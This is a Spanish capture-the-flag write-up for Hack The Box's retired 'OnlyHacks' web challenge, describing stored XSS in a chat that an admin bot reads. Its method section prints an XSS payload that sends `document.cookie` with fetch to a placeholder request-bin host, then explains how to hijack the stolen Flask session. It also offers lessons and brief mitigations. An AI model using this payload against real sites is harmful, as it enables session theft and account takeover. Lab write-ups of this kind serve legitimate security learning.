---
challenge: OnlyHacks
category: Web
difficulty: Very Easy
platform: Hack The Box
state: Retired
tags: [web, xss, cookie-stealing, session-hijack, flask]
type: Web
---

# OnlyHacks — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags reales.

## TL;DR

Una app de citas con chat. Los mensajes **no se sanean**: XSS almacenado. Un bot con sesión de administradora revisa la conversación cada pocos segundos, así que un payload que envía `document.cookie` a un *request bin* entrega su **cookie de sesión de Flask**; cambiándola se entra en su cuenta.

## Enunciado y superficie

- Categoría Web; el reto entrega el material descrito en «Reconocimiento».

## Reconocimiento

- Superficie reducida a lo que entrega el enunciado; el detalle está en «Enunciado y superficie».

## Análisis del código

- El reto no entrega código fuente; el análisis se apoya en el comportamiento descrito en «Explicación del fallo».

## Explicación del fallo

Una app de citas con chat. Los mensajes **no se sanean**: XSS almacenado. Un bot con sesión de administradora revisa la conversación cada pocos segundos, así que un payload que envía `document.cookie` a un *request bin* entrega su **cookie de sesión de Flask**; cambiándola se entra en su cuenta.

## Reproducción local

- Levanta la misma versión del servicio en un contenedor y apunta el exploit a `127.0.0.1`.

## Explotación

- Ver las secciones adyacentes para el detalle.

## Evidencia

- Instancia web (registro con usuario, contraseña y avatar).

## Lecciones aprendidas

- **Cookie httpOnly**: si la cookie fuese `httpOnly`, el XSS no podría leerla; aquí no lo es.
- **Bot lento**: tarda entre 5 y 10 segundos; no reenviar el payload en bucle.
- **Firma de Flask**: la cookie se puede decodificar en base64, pero sin la `SECRET_KEY` no se puede forjar; hay que robarla, no fabricarla.

- XSS almacenado más un bot con privilegios es escalada de cuenta, no sólo un popup.
- Las cookies de sesión sin `httpOnly` son legibles por JavaScript.
- Un `fetch` a un dominio externo exfiltra datos sin necesitar imágenes.

## Mitigaciones y detección

- Aplicar la corrección de la categoría: validación en servidor, versiones parcheadas y mínimo privilegio.
- Detección: revisar los logs de la aplicación y alertar de 4xx/5xx repetidos o entradas anómalas.

## Método

1. **Registro**: crear cuenta y subir avatar (si no, el registro se queja de usuario duplicado).
2. **Confirmar el XSS**: enviar `<img src=x onerror=alert(1)>` en el chat; si salta el diálogo en tu propio navegador, se ejecuta.
3. **Robar la cookie**: montar un endpoint (RequestBin/Pipedream) y enviar

```html
<img src="x" onerror="fetch('https://<tu-bin>/?c='+document.cookie)">
```

4. **Esperar al bot**: la administradora contesta por intervalos; cuando procese el mensaje, la petición llega al bin con `session=<base64>.<firma>`.
5. **Suplantar**: en DevTools → Application → Cookies, sustituir la propia sesión por la robada y recargar; se ve su conversación, donde está la flag.
